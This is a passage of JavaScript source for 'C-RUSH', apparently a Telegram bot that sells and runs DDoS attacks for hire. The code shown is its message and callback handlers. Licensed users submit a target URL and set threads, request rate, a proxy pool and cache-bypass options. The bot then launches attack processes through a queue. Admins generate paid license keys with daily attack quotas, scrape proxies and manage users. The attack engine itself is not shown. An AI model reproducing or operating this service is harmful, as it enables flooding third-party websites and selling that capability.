        if (!c || c < 1 || c > 10) return bot.sendMessage(chatId, '❌ 1 - 10.');
        st.data.maxConcurrent = c;

        const key = genLicenseKey();
        licenses[key] = {
            key,
            durationDays:    st.data.days,
            maxUses:         st.data.uses,
            dailyLimit:      st.data.dailyLimit,
            cooldownSeconds: st.data.cooldownSeconds,
            maxConcurrent:   st.data.maxConcurrent,
            usedCount: 0,
            usedBy: [],
            createdAt: now(),
            expiresAt: now() + 365 * DAY,
            createdBy: userId,
        };
        saveJSON(FILES.licenses, licenses);
        stats.totalLicenses = (stats.totalLicenses || 0) + 1;
        saveJSON(FILES.stats, stats);
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *License created*\n\n` +
            `🔑 \`${key}\`\n\n` +
            `📅 Access: ${st.data.days} day(s)\n` +
            `👥 Activations: ${st.data.uses === 9999 ? '∞' : st.data.uses}\n` +
            `📊 Daily: ${st.data.dailyLimit}/day\n` +
            `⏳ Cooldown: ${st.data.cooldownSeconds}s\n` +
            `🧵 Concurrent: ${st.data.maxConcurrent}\n\n` +
            `Send this key to your customer.`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- Broadcast ----
    if (st.step === 'adm_broadcast') {
        if (!isAdmin(userId)) return;
        const text = msg.text;
        let ok = 0, fail = 0;
        for (const id of Object.keys(users)) {
            try { await bot.sendMessage(id, `📢 *Admin broadcast*\n\n${text}`, { parse_mode: 'Markdown' }); ok++; }
            catch { fail++; }
        }
        userState.delete(chatId);
        return bot.sendMessage(chatId, `📢 Sent.\n✅ ${ok} | ❌ ${fail}`);
    }

    // ---- Proxies text paste ----
    if (st.step === 'adm_proxies') {
        if (!isAdmin(userId)) return;

        const newLines = parseProxyLines(msg.text);
        if (!newLines.length) {
            return bot.sendMessage(chatId,
                '❌ No valid proxies found.\n\nExpected: `host:port` on each line.\n\n' +
                '💡 You can also send a `.txt` file.',
                { parse_mode: 'Markdown' }
            );
        }

        const mode   = st.data.mode || 'add';
        const result = mergeProxies(newLines, mode);
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *Proxies updated (text paste)*\n\n` +
            `📥 Valid lines: ${result.submitted}\n` +
            `➕ Added: ${result.added}\n` +
            `♻️ Mode: ${result.mode === 'replace' ? 'REPLACED' : 'MERGED'}\n` +
            (result.dupes > 0 ? `🔁 Duplicates skipped: ${result.dupes}\n` : '') +
            `📊 Total in pool: *${result.total}*\n` +
            `📁 File: \`data/proxies.txt\``,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- Ban / Unban ----
    if (st.step === 'adm_ban' || st.step === 'adm_unban') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].banned = st.step === 'adm_ban';
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ User \`${tgt}\` ${st.step === 'adm_ban' ? 'banned' : 'unbanned'}.`,
            { parse_mode: 'Markdown' });
    }

    // ---- Reset cooldown ----
    if (st.step === 'adm_reset_cd') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].lastAttackAt = 0;
        users[tgt].daily = { date: todayStr(), count: 0 };
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `♻️ Cooldown + daily counter reset for \`${tgt}\`.`,
            { parse_mode: 'Markdown' });
    }

    // ---- Add / remove admin ----
    if (st.step === 'adm_add_admin' || st.step === 'adm_rm_admin') {
        if (!isOwner(userId)) return bot.sendMessage(chatId, '❌ Owner only.');
        const tgt = parseInt(msg.text.trim());
        if (!tgt) return;
        if (st.step === 'adm_add_admin') {
            if (!admins.includes(tgt)) admins.push(tgt);
        } else {
            admins = admins.filter(a => a !== tgt);
        }
        saveJSON(FILES.admins, admins);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ Admin \`${tgt}\` ${st.step === 'adm_add_admin' ? 'added' : 'removed'}.`,
            { parse_mode: 'Markdown' });
    }
});

// =============================================================
//  CALLBACK HANDLER
// =============================================================
bot.on('callback_query', (q) => {
    const chatId = q.message.chat.id;
    const userId = q.from.id;
    const msgId  = q.message.message_id;
    const data   = q.data;

    const ans  = t => bot.answerCallbackQuery(q.id, { text: t }).catch(() => {});
    const edit = (t, kb) => bot.editMessageText(t, {
        chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: kb,
    }).catch(() => {});

    if (data === 'menu_attack') {
        if (!isLicensed(userId)) return ans('❌ No active license');
        userState.set(chatId, { step: 'attack_target', data: {} });
        return edit(`🎯 *New Attack*\n\n🔗 Send target URL:\nExample: \`https://target.com\``);
    }

    if (data === 'menu_active') {
        const list = [...activeAttacks.values()].filter(a => a.userId === userId);
        if (!list.length) return ans('📭 No active attacks');
        const kb = { inline_keyboard: [] };
        let txt = '📊 *Your Active Attacks*\n\n';
        for (const a of list) {
            const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
            txt += `#${a.id} → \`${a.target}\` — ${rem}s\n`;
            kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
        }
        return edit(txt, kb);
    }

    if (data === 'menu_license') {
        const u = getUser(userId);
        const lic = getLicenseForUser(userId);
        resetDailyIfNeeded(u);
        const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
        return edit(
            `🔑 *License Info*\n\n` +
            `🆔 User ID: \`${userId}\`\n` +
            `📝 Key: \`${u.licenseKey || '—'}\`\n` +
            `📅 Activated: ${fmtDate(u.activatedAt)}\n` +
            `⏳ Expires: ${fmtDate(u.expiresAt)}\n\n` +
            `📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
            `⏱ Cooldown: ${lic?.cooldownSeconds ?? 60}s ${cdRemain > 0 ? `(${cdRemain}s left)` : '✅'}\n` +
            `🧵 Concurrent: ${lic?.maxConcurrent ?? 1}\n` +
            `🔥 Total attacks: ${u.totalAttacks || 0}`
        );
    }

    if (data === 'menu_admin' && isAdmin(userId)) {
        return edit('🛡 *Admin Panel*', adminMenuKeyboard());
    }

    // ---- attack options ----
    if (data.startsWith('opt_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_options') return ans('Session expired');
        const o = st.data.options;
        if (data === 'opt_cookies')  { o.cookies  = !o.cookies;  return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_headfull') { o.headfull = !o.headfull; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cache')    { o.cache    = !o.cache;    return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_silent')   { o.silent   = !o.silent;   return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_version')  { o.version  = o.version === '2' ? '1' : '2'; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cancel')   { userState.delete(chatId); return edit('❌ Cancelled.'); }
        if (data === 'opt_confirm') {
            const { target, duration, threads, rate, options } = st.data;
            userState.delete(chatId);
            startAttack(chatId, userId, target, duration, threads, rate, options, t => edit(t));
            return ans('🚀 Dispatched');
        }
    }

    // ---- defaults ----
    if (data === 'def_threads') {
        const st = userState.get(chatId);
        if (!st) return ans('Session expired');
        st.data.threads = 20;
        st.step = 'attack_rate';
        return edit(`⚡ Rate per thread (1 - ${CONFIG.HARD_MAX_RATE}):`, {
            inline_keyboard: [[{ text: 'Use default (64)', callback_data: 'def_rate' }]]
        });
    }
    if (data === 'def_rate') {
        const st = userState.get(chatId);
        if (!st) return ans('Session expired');
        st.data.rate = 64;
        st.data.options = { cookies: false, headfull: true, cache: true, silent: true, version: '2' };
        st.step = 'attack_options';
        return edit('🔧 Configure options:', attackOptionsKeyboard(st.data));
    }

    // ---- stop single attack ----
    if (data.startsWith('stop_')) {
        const id = parseInt(data.slice(5));
        const a = activeAttacks.get(id);
        if (!a) return ans('Attack not found');
        if (a.userId !== userId && !isAdmin(userId)) return ans('Permission denied');
        try { a.proc.kill('SIGKILL'); } catch {}
        return ans(`🛑 Attack #${id} stopped`);
    }

    // ---- admin only below ----
    if (!isAdmin(userId)) return ans('Access denied');

    if (data === 'adm_stats') {
        return edit(
            `📊 *Bot Stats*\n\n` +
            `👥 Users: ${Object.keys(users).length}\n` +
            `🔑 Licenses: ${Object.keys(licenses).length}\n` +
            `⚡ Active attacks: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
            `🧵 Active threads: ${totalActiveThreads}/${CONFIG.MAX_TOTAL_THREADS}\n` +
            `⏳ Queue: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n` +
            `🔥 Total attacks: ${stats.totalAttacks}\n` +
            `💾 RAM used: ${Math.round(process.memoryUsage().rss / 1048576)} MB\n` +
            `🆓 Free RAM: ${freeMemMB()} MB\n` +
            `⏱ Uptime: ${Math.floor(process.uptime() / 60)}m`,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_pool') {
        let txt = `🏊 *Pool Status*\n\n`;
        txt += `*Global*\n`;
        txt += `• Active: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n`;
        txt += `• Threads: ${totalActiveThreads}/${CONFIG.MAX_TOTAL_THREADS}\n`;
        txt += `• Queue: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n`;
        txt += `• Free RAM: ${freeMemMB()} MB\n\n`;

        if (activeAttacks.size > 0) {
            txt += `*Active Attacks*\n`;
            const byUser = {};
            for (const a of activeAttacks.values()) {
                byUser[a.userId] = (byUser[a.userId] || 0) + 1;
            }
            for (const [uid, count] of Object.entries(byUser)) {
                txt += `• \`${uid}\` — ${count} attack(s)\n`;
            }
            txt += '\n';
        }

        if (attackQueue.length > 0) {
            txt += `*Queue (FIFO)*\n`;
            attackQueue.slice(0, 10).forEach((q, i) => {
                txt += `${i + 1}. \`${q.userId}\` → \`${q.target}\` (${q.threads}t)\n`;
            });
            if (attackQueue.length > 10) txt += `... +${attackQueue.length - 10} more\n`;
        }

        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_users') {
        const ids = Object.keys(users);
        if (!ids.length) return edit('No users yet.', adminMenuKeyboard());
        let txt = '👥 *Users (last 25)*\n\n';
        ids.slice(-25).forEach(id => {
            const u = users[id];
            const st = u.banned ? '🚫' : (isLicensed(id) ? '✅' : '❌');
            resetDailyIfNeeded(u);
            txt += `${st} \`${id}\` ${u.username ? '@' + esc(u.username) : esc(u.firstName || '')} — ${u.daily?.count ?? 0}\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_gen_license') {
        userState.set(chatId, { step: 'adm_lic_days', data: {} });
        return edit('📅 Access duration (days):');
    }

    if (data === 'adm_licenses') {
        const keys = Object.keys(licenses);
        if (!keys.length) return edit('No licenses yet.', adminMenuKeyboard());
        let txt = '📋 *Licenses (last 10)*\n\n';
        keys.slice(-10).forEach(k => {
            const l = licenses[k];
            txt += `\`${k}\`\n📅 ${l.durationDays}d | 👥 ${l.usedCount}/${l.maxUses === 9999 ? '∞' : l.maxUses} | 📊 ${l.dailyLimit ?? 5}/day | ⏳ ${l.cooldownSeconds ?? 60}s\n\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_stop_all') {
        let n = 0;
        for (const a of activeAttacks.values()) { try { a.proc.kill('SIGKILL'); n++; } catch {} }
        return ans(`🛑 Stopped ${n} attack(s)`);
    }

    if (data === 'adm_proxies_add') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'add' } });
        return edit(
            '➕ *Add Proxies*\n\n' +
            'Send either:\n' +
            '• `host:port` pasted as text (one per line)\n' +
            '• a `.txt` file with the same format\n\n' +
            'New proxies will be *merged* into the existing pool.'
        );
    }

    if (data === 'adm_proxies_replace') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'replace' } });
        return edit(
            '♻️ *Replace Proxies*\n\n' +
            '⚠️ This will *wipe* the existing pool and use only what you send.\n\n' +
            'Send either:\n' +
            '• `host:port` pasted as text (one per line)\n' +
            '• a `.txt` file with the same format'
        );
    }

    if (data === 'adm_proxies_count') {
        let count = 0, size = 0;
        try {
            const raw = fs.readFileSync(FILES.proxies, 'utf8');
            const lines = raw.split('\n').map(l => l.trim()).filter(Boolean);
            count = lines.length;
            size = Buffer.byteLength(raw);
        } catch {}
        return edit(
            `📈 *Proxy Pool*\n\n` +
            `🔢 Total proxies: *${count}*\n` +
            `💾 File size: ${(size/1024).toFixed(2)} KB\n` +
            `📁 Path: \`data/proxies.txt\``,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_proxies_scrape') {
        const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
        if (!fs.existsSync(scriptPath)) return ans('c-rush.js not found');
        const proc = spawn('node', [CONFIG.SCRIPT_PATH, 'scrape'], { cwd: __dirname, stdio: 'ignore' });
        proc.on('exit', code => {
            bot.sendMessage(chatId,
                code === 0
                    ? `✅ Proxy scrape finished. Refresh count via *Proxy Count*.`
                    : `⚠️ Scrape exited with code ${code}.`,
                { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
            ).catch(() => {});
        });
        return ans('🌐 Scraping in background...');
    }

    if (data === 'adm_broadcast') {
        userState.set(chatId, { step: 'adm_broadcast', data: {} });
        return edit('📢 Send broadcast message:');
    }

    if (data === 'adm_ban')        { userState.set(chatId, { step: 'adm_ban',       data: {} }); return edit('🚫 Numeric user ID to ban:'); }
    if (data === 'adm_unban')      { userState.set(chatId, { step: 'adm_unban',     data: {} }); return edit('✅ Numeric user ID to unban:'); }
    if (data === 'adm_reset_cd')   { userState.set(chatId, { step: 'adm_reset_cd',  data: {} }); return edit('♻️ Numeric user ID to reset cooldown:'); }
    if (data === 'adm_add_admin')  { userState.set(chatId, { step: 'adm_add_admin', data: {} }); return edit('👤 Numeric user ID to promote:'); }
    if (data === 'adm_rm_admin')   { userState.set(chatId, { step: 'adm_rm_admin',  data: {} }); return edit('🗑 Numeric user ID to demote:'); }

    // ---- license uses buttons ----
    if (data.startsWith('lic_uses_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_uses') return ans('Session expired');
        st.data.uses = data === 'lic_uses_inf' ? 9999 : parseInt(data.replace('lic_uses_', ''));
        st.step = 'adm_lic_daily';
        return edit('📊 Daily attack limit for this license (1 - 1000):');
    }
});

// =============================================================
//  PERIODIC QUEUE DRAIN
// =============================================================
setInterval(() => {
    if (attackQueue.length > 0) drainQueue();
}, 3000);

// =============================================================
//  GRACEFUL SHUTDOWN
// =============================================================
function shutdown(sig) {
    console.log(`\n[${sig}] Shutting down…`);
    for (const a of activeAttacks.values()) {
        try { a.proc.kill('SIGKILL'); } catch {}
    }
    for (const q of attackQueue) {
        try { q.reply?.('⚠️ Bot restarting — your queued attack was dropped.'); } catch {}
    }
    process.exit(0);
}
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));

// =============================================================
//  BOOT
// =============================================================
bot.sendMessage(CONFIG.OWNER_ID,
    `✅ *C-RUSH Bot Online*\n\n` +
    `⚡ RAM free: ${freeMemMB()} MB\n` +
    `👥 Users: ${Object.keys(users).length}\n` +
    `🔑 Licenses: ${Object.keys(licenses).length}\n` +
    `🏊 Pool: 0/${CONFIG.MAX_CONCURRENT_ATTACKS} active | ${CONFIG.MAX_TOTAL_THREADS} thread budget`,
    { parse_mode: 'Markdown' }
).catch(() => {});

process.on('uncaughtException',  e => console.error('[uncaught]', e.message));
process.on('unhandledRejection', e => console.error('[rejection]', (e && e.message) || e));

console.log('⚡ C-RUSH bot started. Owner:', CONFIG.OWNER_ID);
console.log('   Pool:', CONFIG.MAX_CONCURRENT_ATTACKS, 'attacks |', CONFIG.MAX_TOTAL_THREADS, 'threads |', CONFIG.MAX_QUEUE_SIZE, 'queue');
console.log('   Free RAM:', freeMemMB(), 'MB');
